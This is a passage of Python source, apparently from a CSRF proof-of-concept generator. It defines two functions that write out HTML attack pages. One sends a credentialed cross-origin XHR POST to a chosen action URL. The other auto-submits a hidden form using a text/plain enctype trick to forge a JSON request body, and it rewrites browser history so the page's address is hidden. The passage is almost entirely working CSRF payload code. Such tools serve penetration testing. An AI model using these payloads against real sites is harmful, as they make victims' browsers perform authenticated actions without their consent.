# ----------------------------------------------------------------
# P5: POST AJAX/XHR (withCredentials)
# ----------------------------------------------------------------
def gen_post_xhr(action: str, params: dict) -> str:
    body = urlencode(params)
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF XHR PoC</title></head>
<body>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("POST", "{action}", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("{body}");
  </script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-post-xhr.html", html)


# ----------------------------------------------------------------
# P6: JSON via text/plain enctype trick
# ----------------------------------------------------------------
def gen_json_textplain(action: str, params: dict) -> str:
    json_str = json.dumps(params)
    # text/plain enctype sends name=value; we craft so the result is valid JSON
    # name = '{"key":"'  value = '","key2":"val2"}'
    # The = between them produces: {"key":"=","key2":"val2"}
    # To get cleaner JSON, we use a single input with the full payload
    key_part = json_str[:-1]  # everything except closing }
    val_part = "}"
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF JSON PoC</title></head>
<body>
  <script>history.pushState('', '', '/');</script>
  <form id="csrfform" action="{action}" method="POST" enctype="text/plain">
      <input type="hidden" name='{key_part}' value='{val_part}' />
      <input type="submit" value="Submit" />
  </form>
  <script>document.getElementById('csrfform').submit();</script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-json-textplain.html", html)


# ----------------------------------------------------------------
